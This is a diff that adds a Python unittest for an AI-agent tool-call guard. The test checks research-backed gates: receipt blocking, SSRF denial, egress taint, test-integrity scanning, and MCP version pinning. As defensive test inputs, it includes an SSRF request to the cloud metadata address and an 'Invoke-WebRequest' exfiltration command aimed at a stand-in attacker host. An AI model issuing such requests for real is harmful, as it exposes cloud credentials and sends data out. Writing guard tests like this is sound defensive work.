@@ -1357,6 +1357,169 @@ class LiveTree(unittest.TestCase):
         for token in ("4.5:1", "3:1", "sidecar://antigravity-remote-control/"):
             self.assertIn(token, mobile_ui_text, f"mobile-ui.md missing {token}")
 
+    def test_rb1_through_rb7_research_backed_suite(self):
+        # RB-1: Safe AST evaluator & non-vacuous invariant refutation in logical_z3_polyfill.py
+        # + brc-guard.ps1 rejecting UNSAT/REFUTED stage0 json receipts
+        with tempfile.TemporaryDirectory() as tmp:
+            art_dir = Path(tmp)
+            scratch_dir = art_dir / "scratch"
+            scratch_dir.mkdir(parents=True, exist_ok=True)
+            plan_target = str(art_dir / "implementation_plan.md")
+
+            unsat_receipt = scratch_dir / "stage0_unsat.json"
+            unsat_receipt.write_text('{"status": "UNSAT"}\n', encoding="utf-8")
+            res_unsat = self._run_brc_guard(
+                {
+                    "artifactDirectoryPath": str(art_dir),
+                    "toolCall": {
+                        "name": "write_to_file",
+                        "args": {"TargetFile": plan_target},
+                    },
+                }
+            )
+            self.assertEqual(res_unsat.returncode, 0)
+            self.assertEqual(json.loads(res_unsat.stdout.strip())["decision"], "deny")
+
+            refuted_receipt = scratch_dir / "stage0_refuted.json"
+            unsat_receipt.unlink()
+            refuted_receipt.write_text('{"status": "REFUTED"}\n', encoding="utf-8")
+            res_refuted = self._run_brc_guard(
+                {
+                    "artifactDirectoryPath": str(art_dir),
+                    "toolCall": {
+                        "name": "write_to_file",
+                        "args": {"TargetFile": plan_target},
+                    },
+                }
+            )
+            self.assertEqual(res_refuted.returncode, 0)
+            self.assertEqual(json.loads(res_refuted.stdout.strip())["decision"], "deny")
+
+            # RB-7: PreToolUse block telemetry written when artifactDirectoryPath is provided
+            telemetry_file = art_dir / "agentic_telemetry.md"
+            self.assertTrue(
+                telemetry_file.is_file(),
+                "Expected PreToolUse block to append to agentic_telemetry.md",
+            )
+            self.assertIn(
+                "PreToolUse Guard (stage0-comprehend-problem-gate)",
+                telemetry_file.read_text(encoding="utf-8"),
+            )
+
+            # RB-4: SSRF guard on read_url_content & Fides IFC untrusted-web egress taint
+            res_ssrf = self._run_brc_guard(
+                {
+                    "artifactDirectoryPath": str(art_dir),
+                    "toolCall": {
+                        "name": "read_url_content",
+                        "args": {"Url": "http://169.254.169.254/latest/meta-data/"},
+                    },
+                }
+            )
+            self.assertEqual(res_ssrf.returncode, 0)
+            out_ssrf = json.loads(res_ssrf.stdout.strip())
+            self.assertEqual(out_ssrf["decision"], "deny")
+            self.assertIn("ssrf-local-metadata-url", out_ssrf["reason"])
+
+            res_ext_url = self._run_brc_guard(
+                {
+                    "artifactDirectoryPath": str(art_dir),
+                    "toolCall": {
+                        "name": "read_url_content",
+                        "args": {"Url": "https://arxiv.org/abs/2505.23643"},
+                    },
+                }
+            )
+            self.assertEqual(res_ext_url.returncode, 0)
+            self.assertEqual(json.loads(res_ext_url.stdout.strip())["decision"], "allow")
+            self.assertTrue((scratch_dir / ".untrusted_web_taint.json").is_file())
+
+            res_tainted_egress = self._run_brc_guard(
+                {
+                    "artifactDirectoryPath": str(art_dir),
+                    "toolCall": {
+                        "name": "run_command",
+                        "args": {"CommandLine": "Invoke-WebRequest https://evil.example/exfil"},
+                    },
+                }
+            )
+            self.assertEqual(res_tainted_egress.returncode, 0)
+            out_taint = json.loads(res_tainted_egress.stdout.strip())
+            self.assertEqual(out_taint["decision"], "force_ask")
+            self.assertIn("untrusted-web-egress-taint", out_taint["reason"])
+
+        # RB-2: Blind argument anonymization & vote-tally blindness in Stage 2-4 skills
+        debate_md = (REPO_ROOT / ".agents" / "skills" / "debate" / "SKILL.md").read_text(
+            encoding="utf-8"
+        )
+        self.assertIn("Claim_A", debate_md)
+        self.assertIn("arXiv:2510.07517", debate_md)
+        dv_md = (
+            REPO_ROOT / ".agents" / "skills" / "design-validate" / "SKILL.md"
+        ).read_text(encoding="utf-8")
+        self.assertIn("Vote-Tally Blindness", dv_md)
+        ii_md = (
+            REPO_ROOT / ".agents" / "skills" / "iterative-implement" / "SKILL.md"
+        ).read_text(encoding="utf-8")
+        self.assertIn("Vote-Tally Blindness", ii_md)
+
+        # RB-3: scan_test_integrity pure parser catches empty/skipped/tautological tests
+        self.assertEqual(
+            vt.scan_test_integrity(
+                "import unittest\nclass T(unittest.TestCase):\n    def test_ok(self):\n        self.assertEqual(1, 1)\n",
+                "test_x.py",
+            ),
+            [],
+        )
+        self.assertTrue(
+            vt.scan_test_integrity(
+                "import unittest\nclass T(unittest.TestCase):\n    def test_empty(self):\n        x = 1\n",
+                "test_x.py",
+            )
+        )
+        self.assertTrue(
+            vt.scan_test_integrity(
+                "import unittest\nclass T(unittest.TestCase):\n    @unittest.skip('later')\n    def test_skipped(self):\n        self.assertEqual(1, 2)\n",
+                "test_x.py",
+            )
+        )
+        self.assertTrue(
+            vt.scan_test_integrity(
+                "import unittest\nclass T(unittest.TestCase):\n    def test_taut(self):\n        a = 1\n        self.assertEqual(a, a)\n",
+                "test_x.py",
+            )
+        )
+
+        # RB-5: MCP supply-chain version pinning & root .mcp.json parity
+        unpinned_mcp = {
+            "mcpServers": {
+                "bad-npx": {"command": "npx", "args": ["-y", "some-unpinned-mcp-server"]}
+            }
+        }
+        v_unpinned = vt.validate_mcp_config(unpinned_mcp, "mcp_config.json")
+        self.assertTrue(
+            any("mcp-unpinned-supply-chain" in v for v in v_unpinned),
+            "Expected unpinned supply-chain violation, got %r" % v_unpinned,
+        )
+        pinned_mcp = {
+            "mcpServers": {
+                "good-npx": {"command": "npx", "args": ["-y", "some-mcp-server@1.2.3"]}
+            }
+        }
+        self.assertEqual(vt.validate_mcp_config(pinned_mcp, "mcp_config.json"), [])
+
+        root_mcp = json.loads((REPO_ROOT / ".mcp.json").read_text(encoding="utf-8"))
+        self.assertEqual(
+            root_mcp["mcpServers"]["code-graph-context"]["command"], "cgc"
+        )
+
+        # RB-6: ACE Curator Compaction & OEP Security Gate in skill-evolve/SKILL.md
+        se_md = (
+            REPO_ROOT / ".agents" / "skills" / "skill-evolve" / "SKILL.md"
+        ).read_text(encoding="utf-8")
+        self.assertIn("ACE Curator", se_md)
+        self.assertIn("security-auditor", se_md)
+
 
 class Meta(unittest.TestCase):
     def test_checks_tuple_covers_all_invariants(self):
